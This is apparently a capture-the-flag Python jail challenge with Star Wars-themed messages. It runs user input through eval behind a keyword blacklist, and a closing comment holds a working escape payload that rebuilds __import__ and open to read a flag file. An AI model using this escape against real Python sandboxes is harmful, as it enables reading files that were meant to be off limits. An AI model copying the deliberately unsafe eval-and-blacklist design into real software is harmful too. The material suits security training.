#!/usr/bin/python3
import time

def greeting():
    time.sleep(0.1)

    print("You rebel scum won't escape my inescapable fortress. My magnificent fortress!")

    time.sleep(0.5)

    print("\nDon't you even dare use your filthy Jedi mind tricks! They have no power here!\n")

    time.sleep(0.5)

    with open("darth-vader_ascii-art.txt", "r", encoding="utf-8") as art:
        for line in art:
            line = line.replace('\n', '')
            print(line)
            time.sleep(0.1)

def sandbox():
    with open("blacklist.txt", "r") as f:
        blacklist = [keyword.strip() for keyword in f if keyword.strip()]

    while True:
        try:
            code = input(">>> ")
            if not code.isascii():
                print("Stealing an Imperial uniform! Not on my watch!")
                continue
            
            hit = next((kw for kw in blacklist if kw in code), None)
            if hit:
                print(f"You're dead, rebel! {hit} is not allowed here!")
                continue

            eval(code, {'__builtins__': None})
        except Exception as e:
            print("Error occurred! See you, rebel!")
            print(e)

if __name__ == "__main__":
    greeting()
    sandbox()

# ((S:=(()).__class__.__base__.__subclasses__()),(C:=(X for X in S if X.__init__.__class__==(lambda:0).__class__ and X.__init__.__globals__.get('__builtins__') and X.__init__.__globals__.get('__builtins__').__class__==X.__init__.__globals__.__class__).__next__()),(G:=C.__init__.__globals__),(B:=G.__getitem__('__builtins__')),(IK:=(K for K in B if K.__len__()==10 and K[0]=='_' and K[1]=='_' and K[2]=='i' and K[3]=='m' and K[4]=='p' and K[5]=='o' and K[6]=='r' and K[7]=='t' and K[8]=='_' and K[9]=='_').__next__()),(IM:=B.__getitem__(IK)),(OK:=(K for K in B if K.__len__()==4 and K[0]=='o' and K[1]=='p' and K[2]=='e' and K[3]=='n').__next__()),(OP:=B.__getitem__(OK)),(PL:=IM('pathlib')),(FN:=(N for N in (P.name for P in PL.Path('.').glob('*')) if N.__len__()>=4 and N[0]=='f' and N[1]=='l' and N[2]=='a' and N[3]=='g').__next__()),(0).__getattribute__(OP(FN).__iter__().__next__()))[-1]
